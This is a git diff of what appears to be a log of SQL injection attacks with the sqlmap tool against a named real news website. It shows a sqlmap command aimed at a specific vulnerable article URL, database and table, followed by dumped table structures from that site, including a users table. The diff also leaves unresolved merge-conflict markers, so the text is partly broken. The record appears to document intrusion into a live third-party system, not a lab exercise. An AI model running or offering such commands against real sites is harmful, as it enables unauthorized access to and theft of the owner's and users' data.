@@ -201,6 +201,7 @@ Table: amazon
 sqlmap -u https://www.thebostonpilot.com/article.php?ID=193823 --dbms mysql --batch --random-agent -D pilotdatabase -T bc_schools_query --columns 
 
 Database: pilotdatabase
+<<<<<<< HEAD
 Table: we_users
 [1 entry]
 +----------+--------+
@@ -228,4 +229,16 @@ Table: twitter
 | tblid          | int(11)      |
 | twitter_Time   | datetime     |
 +----------------+--------------+
+=======
+Table: pb_push_log_pilot
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| Headline | varchar(255) |
+| id       | int(11)      |
+| TS       | timestamp    |
++----------+--------------+
+
+>>>>>>> bb9a461b578e4b2bfb9b08b284b657e2d31bc483
 
